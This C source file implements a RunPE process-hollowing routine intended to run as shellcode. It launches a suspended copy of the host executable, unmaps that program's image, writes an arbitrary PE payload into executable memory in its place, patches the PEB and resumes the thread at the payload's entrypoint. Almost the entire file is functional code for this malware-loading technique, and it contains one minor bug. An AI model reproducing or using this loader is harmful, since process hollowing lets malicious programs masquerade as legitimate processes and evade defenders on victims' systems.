#include <Windows.h>
#include <winternl.h>

#include "x86-shellcode-runpe.h"

int
runpe(struct dll_imports* imports, PBYTE pe_image, DWORD* proc_id)
{
  int ret = 0;

  /*
    We purposely will not validate the PE image.
    This shellcode must be small and it *will* crash if given a wrong PE
    image.
  */

  PIMAGE_DOS_HEADER p_dos = (PIMAGE_DOS_HEADER)pe_image;
  PIMAGE_NT_HEADERS p_nt = (PIMAGE_NT_HEADERS)(pe_image + p_dos->e_lfanew);
  PIMAGE_SECTION_HEADER p_sections = IMAGE_FIRST_SECTION(p_nt);

  WCHAR cur_proc_path[MAX_PATH + 1];

  libc_memset(&cur_proc_path, 0, sizeof cur_proc_path);

  if (!imports->GetModuleFileNameW(NULL, cur_proc_path, MAX_PATH)) {
    return -1;
  }

  PROCESS_INFORMATION proc_info;
  STARTUPINFOW start_info;

  libc_memset(&proc_info, 0, sizeof proc_info);
  libc_memset(&start_info, 0, sizeof start_info);

  start_info.cb = sizeof start_info;

  if (!imports->CreateProcessW(cur_proc_path,
                               imports->GetCommandLineW(),
                               NULL,
                               NULL,
                               FALSE,
                               CREATE_SUSPENDED,
                               NULL,
                               NULL,
                               &start_info,
                               &proc_info)) {
    return -2;
  }

  CONTEXT thread_ctx;
  libc_memset(&thread_ctx, 0, sizeof thread_ctx);

  thread_ctx.ContextFlags = CONTEXT_FULL;

  if (!imports->GetThreadContext(proc_info.hThread, &thread_ctx)) {
    ret = -3;
    goto kill_process;
  }

  PVOID p_remote_base;

  PEB dummy_peb;
  /*
    Reserved3[1] is the ImageBaseAddress field.
  */
#ifdef _WIN64
  DWORD64 peb_offset =
    ((DWORD64)&dummy_peb.Reserved3[1]) - ((DWORD64)&dummy_peb);
#else
  DWORD peb_offset = ((DWORD)&dummy_peb.Reserved3[1]) - ((DWORD)&dummy_peb);
#endif

  if (!imports->ReadProcessMemory(
        proc_info.hProcess,
#ifdef _WIN64
        /*
          Rdx is the foreign process PEB structure address.
        */
        (PVOID)(thread_ctx.Rdx + peb_offset),
#else
        /*
          Ebx is the foreign process PEB structure address.
        */
        (PVOID)(thread_ctx.Ebx + peb_offset),
#endif
        &p_remote_base,
        sizeof p_remote_base,
        NULL)) {
    ret = -4;
    goto kill_process;
  }

  if (!NT_SUCCESS(
        imports->ZwUnmapViewOfSection(proc_info.hProcess, p_remote_base))) {
    ret - 5;
    goto kill_process;
  }

  /*
    We are allocating at the base address the image wants to run at
    without rebasing it with it's relocation directory if it has one.

    This means that if the base address the image wants to run at is
    already taken, then we will have a conflict.

    To ensure that there is never a conflict, we can ensure that the
    started process (executable that shellcode is ran by), has an equal or
    greater NT_HDR->OptionalHeader.SizeOfImage, and identical
    NT_HDR->OptionalHeader.ImageBase header as the image we are loading.

    If we unmap the main module of the started process, then there is enough
    space for the image we are loading to be written.

    A good way to increase NT_HDR->OptionalHeader.SizeOfImage is to
    add a section with a VirtualSize corresponding to how much we want
    to increase, without corresponding data in the file (PointerToRawData as
    0), an uninitialized data section (.bss).

    In practice, it is the best solution to the address conflict problem.
    It is not possible to perform image rebasing if the process that we start
    does not itself, have a relocation directory.

    We can of course, detect what the started process has, and make a choice.
    This is considered future work.
    There will be some cases where it will not be possible to load the image.
  */

  PBYTE p_mapped =
    imports->VirtualAllocEx(proc_info.hProcess,
                            (PVOID)p_nt->OptionalHeader.ImageBase,
                            p_nt->OptionalHeader.SizeOfImage,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_EXECUTE_READWRITE);
  if (p_mapped == NULL) {
    ret = -5;
    goto kill_process;
  }

  if (!imports->WriteProcessMemory(proc_info.hProcess,
                                   p_mapped,
                                   pe_image,
                                   p_nt->OptionalHeader.SizeOfHeaders,
                                   NULL)) {
    ret = -6;
    goto kill_process;
  }
  for (size_t i = 0; i < p_nt->FileHeader.NumberOfSections; ++i) {
    if (!imports->WriteProcessMemory(proc_info.hProcess,
                                     p_mapped + p_sections[i].VirtualAddress,
                                     pe_image + p_sections[i].PointerToRawData,
                                     p_sections[i].SizeOfRawData,
                                     NULL)) {
      ret = -7;
      goto kill_process;
    }
  }

  /*
    TODO: Figure out protection flags and set them on the mapped image sections.
  */

  if (!imports->WriteProcessMemory(
        proc_info.hProcess,
#ifdef _WIN64
        /*
          Rdx is the foreign process PEB structure address.
        */
        (PVOID)(thread_ctx.Rdx + peb_offset),
#else
        /*
          Ebx is the foreign process PEB structure address.
        */
        (PVOID)(thread_ctx.Ebx + peb_offset),
#endif
        &p_mapped,
        sizeof p_mapped,
        NULL)) {
    ret = -8;
    goto kill_process;
  }

#ifdef _WIN64
  /*
    The NT loader calls Rcx as the image's entrypoint.
  */
  thread_ctx.Rcx =
    (DWORD64)(p_mapped + p_nt->OptionalHeader.AddressOfEntryPoint);
#else
  /*
    The NT loader calls Eax as the image's entrypoint.
  */
  thread_ctx.Eax = (DWORD)(p_mapped + p_nt->OptionalHeader.AddressOfEntryPoint);
#endif

  if (!imports->SetThreadContext(proc_info.hThread, &thread_ctx)) {
    ret = -9;
    goto kill_process;
  }

  if (!imports->ResumeThread(proc_info.hThread)) {
    ret = -10;
    goto kill_process;
  }

  imports->CloseHandle(proc_info.hProcess);
  imports->CloseHandle(proc_info.hThread);

  if (proc_id) {
    *proc_id = proc_info.dwProcessId;
  }

  return 0;

kill_process:
  imports->TerminateProcess(proc_info.hProcess, -1);
  imports->CloseHandle(proc_info.hThread);
  imports->CloseHandle(proc_info.hProcess);
  return ret;
}
